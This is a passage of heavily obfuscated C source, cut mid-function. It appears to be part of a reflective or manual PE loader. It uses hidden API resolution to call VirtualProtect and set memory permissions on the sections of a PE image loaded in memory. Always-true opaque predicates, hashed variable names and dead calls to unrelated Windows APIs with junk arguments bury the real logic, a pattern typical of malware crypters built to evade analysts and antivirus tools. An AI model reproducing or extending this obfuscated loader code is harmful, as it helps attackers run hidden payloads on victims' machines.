      v59a97adbc2942e6a8544456ef336671c_computation_opaque = (v59a97adbc2942e6a8544456ef336671c_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v59a97adbc2942e6a8544456ef336671c_computation_opaque < ((unsigned int) 3))
      {
        if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
        {
          v59a97adbc2942e6a8544456ef336671c_computation_opaque = (unsigned int) 3;
        }
      }
      while (v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque != ((unsigned int) 1))
      {
        v59a97adbc2942e6a8544456ef336671c_computation_opaque += (unsigned int) 2;
        v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque = (unsigned int) 1;
        if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
        {
          v11a42759d5d5da506e1a6f3d437017d1_computation_opaque = (unsigned int) 3;
          if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
          {
            while ((v11a42759d5d5da506e1a6f3d437017d1_computation_opaque * v11a42759d5d5da506e1a6f3d437017d1_computation_opaque) <= v59a97adbc2942e6a8544456ef336671c_computation_opaque)
            {
              if ((v59a97adbc2942e6a8544456ef336671c_computation_opaque % v11a42759d5d5da506e1a6f3d437017d1_computation_opaque) == ((unsigned int) 0))
              {
                if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                {
                  unsigned long v9901f333fc65a5839296e7771f9159af = (unsigned long) 0x7511015d;
                  if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                  {
                    void * va59c396aabbdce65a37fd2133140aee6 = (void *) 0x1778f6bf;
                    long v061db62f5a03d95f2e1cfd6eca4eba55 = (long) 0x3661031b;
                    v061db62f5a03d95f2e1cfd6eca4eba55 = RoUnregisterForApartmentShutdown(va59c396aabbdce65a37fd2133140aee6);
                  }
                  unsigned long v14749682220a1bd221bdcf30b47138b1 = (unsigned long) 0xce440cee;
                  v14749682220a1bd221bdcf30b47138b1 = MsiGetActiveDatabase(v9901f333fc65a5839296e7771f9159af);
                  if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                  {
                    v59a97adbc2942e6a8544456ef336671c_computation_opaque = v11a42759d5d5da506e1a6f3d437017d1_computation_opaque + v59a97adbc2942e6a8544456ef336671c_computation_opaque;
                  }
                }
                v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque = (unsigned int) 0;
              }
              if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
              {
                unsigned long v88ce08ac61cdaa4e244e340915860609 = (unsigned long) 0x72692033;
                void * v87f41a256b2c323a69890ab85eebbbc1 = (void *) 0x9ee45aed;
                int v1edcc8c7b60ab8bada43e6c1a24770d7 = (int) 0xdc6ec02d;
                void * v7c9be10574d4cc6302ff92e08be88831 = (void *) 0x07c2555a;
                int v546cdfb740c026bc18e813093eee3733 = (int) 0x90bec86a;
                int v0114966bfb41e4176448988205a6fed1 = (int) 0x660341e5;
                v0114966bfb41e4176448988205a6fed1 = IdnToNameprepUnicode(v88ce08ac61cdaa4e244e340915860609, v87f41a256b2c323a69890ab85eebbbc1, v1edcc8c7b60ab8bada43e6c1a24770d7, v7c9be10574d4cc6302ff92e08be88831, v546cdfb740c026bc18e813093eee3733);
              }
              v11a42759d5d5da506e1a6f3d437017d1_computation_opaque = v11a42759d5d5da506e1a6f3d437017d1_computation_opaque + ((unsigned int) 2);
              if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
              {
                vf731280a95e05a499b1a58d35faa3ae9_random_opaque = vb55175dd9af3c0303bce55289e856cc9_useless_opaque * vf81632770fbeb77823e6f83848564f8e_useless_opaque;
                if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                {
                  v59a97adbc2942e6a8544456ef336671c_computation_opaque = v59a97adbc2942e6a8544456ef336671c_computation_opaque | ((unsigned int) 14);
                  vf81632770fbeb77823e6f83848564f8e_useless_opaque = vf731280a95e05a499b1a58d35faa3ae9_random_opaque * ((unsigned int) 48);
                }
              }
            }

          }
        }
      }

      unsigned int v997cc71bb87f56d7a0585801ed8338d4_prime_opaque = v59a97adbc2942e6a8544456ef336671c_computation_opaque;
      {
        DWORD oldProtect;
        if (((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD *)) kernel_library_function_addresses[4])(new_pe->data, new_pe->pe_nt_header->OptionalHeader.SizeOfHeaders, 0x02, &oldProtect) == 0)
          return -1;
        for (int i = 0; i < new_pe->pe_nt_header->FileHeader.NumberOfSections; ++i)
        {
          char *dest = new_pe->data + new_pe->sections[i].VirtualAddress;
          DWORD s_perm = new_pe->sections[i].Characteristics;
          if (!(((v997cc71bb87f56d7a0585801ed8338d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v997cc71bb87f56d7a0585801ed8338d4_prime_opaque == ((unsigned int) 2))))
          {
            unsigned long v2501a3bd5d2db03c45c854572edcc2bb = (unsigned long) 0x377a8e13;
            void * v0842c1cbffdc5093df4ce20bead0760d = (void *) 0x2e24c83b;
            int v381059b3e5414db4d1032463e37c5415 = (int) 0x6e292e40;
            void * vd328511be66ea801309d42106f2648fd = (void *) 0xa19b9d08;
            int v97fee315947209004741f384277e4def = (int) 0xe136e557;
            int v1565c300916a0d0ecb626b3d719476c0 = (int) 0xea206146;
            v1565c300916a0d0ecb626b3d719476c0 = IdnToNameprepUnicode(v2501a3bd5d2db03c45c854572edcc2bb, v0842c1cbffdc5093df4ce20bead0760d, v381059b3e5414db4d1032463e37c5415, vd328511be66ea801309d42106f2648fd, v97fee315947209004741f384277e4def);
          }
          DWORD v_perm = 0;
          if (s_perm & 0x20000000UL)
          {
            if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
            {
              v59a97adbc2942e6a8544456ef336671c_computation_opaque = v997cc71bb87f56d7a0585801ed8338d4_prime_opaque | v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque;
            }
            if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
            {
              unsigned long v9c2172446a0c6a4c49d95332ed5014c0 = (unsigned long) 0x3c3352c5;
              unsigned long v4958a9d6972b9cfa75ef1bdd7e62872e = (unsigned long) 0x218fedc3;
              void * v51e077d748968edb7c785579dbffcd61 = (void *) 0x2cadc00a;
              if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
              {
                int vf4002ea30db449ea991e32a3911e87eb = (int) 0x01cd71cc;
                int v6e3dfded1d430c301479abbe9e1becf7 = (int) 0x40a53cc4;
                if (!(((v997cc71bb87f56d7a0585801ed8338d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v997cc71bb87f56d7a0585801ed8338d4_prime_opaque == ((unsigned int) 2))))
                {
                  v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque = vb55175dd9af3c0303bce55289e856cc9_useless_opaque + v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque;
                }
                v6e3dfded1d430c301479abbe9e1becf7 = GetLocaleInfoW(v9c2172446a0c6a4c49d95332ed5014c0, v4958a9d6972b9cfa75ef1bdd7e62872e, v51e077d748968edb7c785579dbffcd61, vf4002ea30db449ea991e32a3911e87eb);
              }
            }
            v_perm = (s_perm & 0x80000000UL) ? (0x40) : (0x20);
          }
          else
          {
            if (!(((v997cc71bb87f56d7a0585801ed8338d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v997cc71bb87f56d7a0585801ed8338d4_prime_opaque == ((unsigned int) 2))))
            {
              void * v5a403729a72f7e9eb0125f8312b2a3fa = (void *) 0xd105d5de;
              unsigned long v53da69a9da4ca292ba688243f9782b6b = (unsigned long) 0x5e173566;
              unsigned long vd76214dee39d3ae7174d39e2390e478e = (unsigned long) 0x7d246e78;
              vd76214dee39d3ae7174d39e2390e478e = SnmpListen(v5a403729a72f7e9eb0125f8312b2a3fa, v53da69a9da4ca292ba688243f9782b6b);
            }
            if (!(((v997cc71bb87f56d7a0585801ed8338d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v997cc71bb87f56d7a0585801ed8338d4_prime_opaque == ((unsigned int) 2))))
            {
              v59a97adbc2942e6a8544456ef336671c_computation_opaque = vf81632770fbeb77823e6f83848564f8e_useless_opaque | ((unsigned int) 115);
              v11a42759d5d5da506e1a6f3d437017d1_computation_opaque = v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque / v11a42759d5d5da506e1a6f3d437017d1_computation_opaque;
              v997cc71bb87f56d7a0585801ed8338d4_prime_opaque = v997cc71bb87f56d7a0585801ed8338d4_prime_opaque < vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
              vf731280a95e05a499b1a58d35faa3ae9_random_opaque = vf81632770fbeb77823e6f83848564f8e_useless_opaque == v11a42759d5d5da506e1a6f3d437017d1_computation_opaque;
              if (!(((v997cc71bb87f56d7a0585801ed8338d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v997cc71bb87f56d7a0585801ed8338d4_prime_opaque == ((unsigned int) 2))))
              {
                v59a97adbc2942e6a8544456ef336671c_computation_opaque = v11a42759d5d5da506e1a6f3d437017d1_computation_opaque <= vf81632770fbeb77823e6f83848564f8e_useless_opaque;
                vf81632770fbeb77823e6f83848564f8e_useless_opaque = v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque * vf81632770fbeb77823e6f83848564f8e_useless_opaque;
                v59a97adbc2942e6a8544456ef336671c_computation_opaque = v997cc71bb87f56d7a0585801ed8338d4_prime_opaque || vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
                v59a97adbc2942e6a8544456ef336671c_computation_opaque = vf81632770fbeb77823e6f83848564f8e_useless_opaque <= vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
                vf731280a95e05a499b1a58d35faa3ae9_random_opaque = vf81632770fbeb77823e6f83848564f8e_useless_opaque % ((unsigned int) 54);
              }
              vb55175dd9af3c0303bce55289e856cc9_useless_opaque = v59a97adbc2942e6a8544456ef336671c_computation_opaque % vf81632770fbeb77823e6f83848564f8e_useless_opaque;
              v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque = vf731280a95e05a499b1a58d35faa3ae9_random_opaque * v11a42759d5d5da506e1a6f3d437017d1_computation_opaque;
              v997cc71bb87f56d7a0585801ed8338d4_prime_opaque = v59a97adbc2942e6a8544456ef336671c_computation_opaque | v997cc71bb87f56d7a0585801ed8338d4_prime_opaque;
            }
            if (((v997cc71bb87f56d7a0585801ed8338d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v997cc71bb87f56d7a0585801ed8338d4_prime_opaque == ((unsigned int) 2)))
            {
              if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
              {
                v_perm = (s_perm & 0x80000000UL) ? (0x04) : (0x02);
              }
            }
          }
          if (((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD *)) kernel_library_function_addresses[4])(dest, new_pe->sections[i].Misc.VirtualSize, v_perm, &oldProtect) == 0)
            return -1;
          if (!(((v997cc71bb87f56d7a0585801ed8338d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v997cc71bb87f56d7a0585801ed8338d4_prime_opaque == ((unsigned int) 2))))
          {
            vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque + vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
            v997cc71bb87f56d7a0585801ed8338d4_prime_opaque = vf81632770fbeb77823e6f83848564f8e_useless_opaque % ((unsigned int) 82);
            if (!(((v997cc71bb87f56d7a0585801ed8338d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v997cc71bb87f56d7a0585801ed8338d4_prime_opaque == ((unsigned int) 2))))
            {
              v11a42759d5d5da506e1a6f3d437017d1_computation_opaque = vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf81632770fbeb77823e6f83848564f8e_useless_opaque;
            }
            vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v59a97adbc2942e6a8544456ef336671c_computation_opaque / vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
          }
          if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
          {
            void * v3680d3c5f0d7049f7b353eac2da4728d = (void *) 0xe2fd491d;
            unsigned long vbd729a8ce9c470508712103830e6faef = (unsigned long) 0x91287344;
            unsigned long vd410499fdf3a0c067d66ce9e6821caf9 = (unsigned long) 0x969a1eee;
            vd410499fdf3a0c067d66ce9e6821caf9 = SnmpListen(v3680d3c5f0d7049f7b353eac2da4728d, vbd729a8ce9c470508712103830e6faef);
          }
        }

        return 0;
        unsigned int vf54d8ebdbc424e635b2517e63d1ba78f_useless_opaque = (unsigned int) 2584646843;
        unsigned int vfc3334f298f7e83e944ff20b11337734_computation_opaque = (unsigned int) (&vf54d8ebdbc424e635b2517e63d1ba78f_useless_opaque);
        unsigned int va9e18a17551eb22008408fcd353d5853_true_opaque = (((vfc3334f298f7e83e944ff20b11337734_computation_opaque * vfc3334f298f7e83e944ff20b11337734_computation_opaque) + vfc3334f298f7e83e944ff20b11337734_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      }
    }
    unsigned int ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque = (unsigned int) 200685902;
    unsigned int vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque = (unsigned int) 0;
    unsigned int v541540c03d209d5abba9cb44f34d3d7f_computation_opaque = (unsigned int) 3;
    unsigned int v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque = (unsigned int) (&ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque);
    v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque = (v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
    {
      if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
      {
        vb55175dd9af3c0303bce55289e856cc9_useless_opaque = vf731280a95e05a499b1a58d35faa3ae9_random_opaque + vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
        vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque <= vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
      }
    }
    if (v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque < ((unsigned int) 3))
    {
      v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque = (unsigned int) 3;
    }
    while (vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque != ((unsigned int) 1))
    {
      v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque += (unsigned int) 2;
      unsigned int v57a67c5889d76e5f7be542819aa02ca8_useless_opaque = (unsigned int) 3008275073;
      unsigned int v10062067d431d0c9e15631e24fdd4674_computation_opaque = (unsigned int) 0;
      unsigned int ve620a46eec08572992495e882424516c_computation_opaque = (unsigned int) 3;
      if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
      {
        ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque = vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque * ve620a46eec08572992495e882424516c_computation_opaque;
        vb55175dd9af3c0303bce55289e856cc9_useless_opaque = vb55175dd9af3c0303bce55289e856cc9_useless_opaque % v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque;
        ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque == v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque;
        v541540c03d209d5abba9cb44f34d3d7f_computation_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque || ve620a46eec08572992495e882424516c_computation_opaque;
        v10062067d431d0c9e15631e24fdd4674_computation_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque - ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque;
      }
      unsigned int v048979c0003884482a6b8d465204d0c2_computation_opaque = (unsigned int) (&v57a67c5889d76e5f7be542819aa02ca8_useless_opaque);
      if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
      {
        v048979c0003884482a6b8d465204d0c2_computation_opaque = (v048979c0003884482a6b8d465204d0c2_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
        if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
        {
          unsigned long v64c8ea948cbda2055a80f07d00a3b8af = (unsigned long) 0x17c01690;
          unsigned long v5a3bd1ad8926ee752e4ec7abff0ab53a = (unsigned long) 0x4919046a;
          void * v2149d302ee6f3abc32f00c77b61e31ab = (void *) 0x09f82548;
          if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
          {
            int v957b833d2b94b467a8370cbfa0cd3014 = (int) 0x7d153239;
            int ve0adf1b63a2052c4ffc71e816f05af96 = (int) 0x0441f642;
            ve0adf1b63a2052c4ffc71e816f05af96 = GetLocaleInfoW(v64c8ea948cbda2055a80f07d00a3b8af, v5a3bd1ad8926ee752e4ec7abff0ab53a, v2149d302ee6f3abc32f00c77b61e31ab, v957b833d2b94b467a8370cbfa0cd3014);
          }
        }
        if (v048979c0003884482a6b8d465204d0c2_computation_opaque < ((unsigned int) 3))
        {
          if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
          {
            if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
            {
              v048979c0003884482a6b8d465204d0c2_computation_opaque = (unsigned int) 3;
            }
          }
        }
        while (v10062067d431d0c9e15631e24fdd4674_computation_opaque != ((unsigned int) 1))
        {
          v048979c0003884482a6b8d465204d0c2_computation_opaque += (unsigned int) 2;
          v10062067d431d0c9e15631e24fdd4674_computation_opaque = (unsigned int) 1;
          ve620a46eec08572992495e882424516c_computation_opaque = (unsigned int) 3;
          while ((ve620a46eec08572992495e882424516c_computation_opaque * ve620a46eec08572992495e882424516c_computation_opaque) <= v048979c0003884482a6b8d465204d0c2_computation_opaque)
          {
            if ((v048979c0003884482a6b8d465204d0c2_computation_opaque % ve620a46eec08572992495e882424516c_computation_opaque) == ((unsigned int) 0))
            {
              if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
              {
                void * vd72e8068198b02f18f7625d2d5385b0f = (void *) 0x3f4b41bd;
                int v47b88449bbf94b43b0f2943ef0c7de50 = (int) 0x8aeaa895;
                v47b88449bbf94b43b0f2943ef0c7de50 = RemoveDllDirectory(vd72e8068198b02f18f7625d2d5385b0f);
              }
              if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
              {
                vb55175dd9af3c0303bce55289e856cc9_useless_opaque = ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque || vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque;
                ve620a46eec08572992495e882424516c_computation_opaque = v541540c03d209d5abba9cb44f34d3d7f_computation_opaque - vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque;
                if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                {
                  v10062067d431d0c9e15631e24fdd4674_computation_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque || vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque;
                }
                ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque = vf731280a95e05a499b1a58d35faa3ae9_random_opaque == ve620a46eec08572992495e882424516c_computation_opaque;
              }
              v10062067d431d0c9e15631e24fdd4674_computation_opaque = (unsigned int) 0;
            }
            ve620a46eec08572992495e882424516c_computation_opaque = ve620a46eec08572992495e882424516c_computation_opaque + ((unsigned int) 2);
          }

          if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
          {
            ve620a46eec08572992495e882424516c_computation_opaque = v048979c0003884482a6b8d465204d0c2_computation_opaque || v541540c03d209d5abba9cb44f34d3d7f_computation_opaque;
